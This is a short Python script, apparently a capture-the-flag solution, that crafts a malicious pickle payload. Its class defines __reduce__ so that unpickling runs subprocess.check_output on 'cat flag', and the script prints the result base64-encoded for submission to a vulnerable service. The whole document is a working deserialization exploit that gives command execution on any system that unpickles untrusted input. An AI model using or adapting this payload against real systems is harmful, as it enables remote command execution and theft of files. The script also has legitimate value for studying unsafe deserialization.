import pickle
import base64
import subprocess

class Reveal:
    def __reduce__(self):
        cmd = ("cat", "flag")
        return subprocess.check_output, (cmd,)

# Serialize the object
payload_bytes = pickle.dumps(Reveal())

# Base64 encode it safely
payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode()
payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)  # Correct padding

print(payload_b64)
